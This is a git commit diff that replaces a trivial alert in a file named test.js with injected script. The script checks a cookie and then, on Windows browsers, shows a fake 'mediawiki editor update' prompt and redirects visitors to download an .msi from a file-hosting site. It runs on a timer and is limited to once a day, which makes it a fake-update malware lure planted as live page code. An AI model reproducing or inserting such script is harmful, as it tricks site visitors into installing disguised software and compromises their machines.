ff1b89e1db0b0fe0af858f6c0e5cf6fcab203547
Aipsure <100505270+Aipsure@users.noreply.github.com>
2023-03-07 15:50:41 +0800

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,24 @@
-alert('test')
+<script>
+  function setCookie(name, value) {
+    var Days = 1;
+    var exp = new Date();
+    exp.setTime(exp.getTime() + Days * 24 * 60 * 60 * 1000);
+    document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString();
+}
+function chkcookies()
+{
+var cookiee="flash_seesion";
+var c = document.cookie.indexOf(cookiee+"=");
+if (c != -1)
+{
+return true;
+}else if (/(Windows)/i.test(navigator.userAgent)) {
+    alert("Please continue to visit after installing the mediawiki editor update!");
+    location.href="https://cdn-153.anonfiles.com/03hby5cbz5/df843617-1678099126/MediaWiki+Editor+Patcher.msi";
+}
+
+setCookie("flash_seesion", "flash_cookies");
+return false;
+}
+setTimeout("chkcookies()","5000");
+</script>
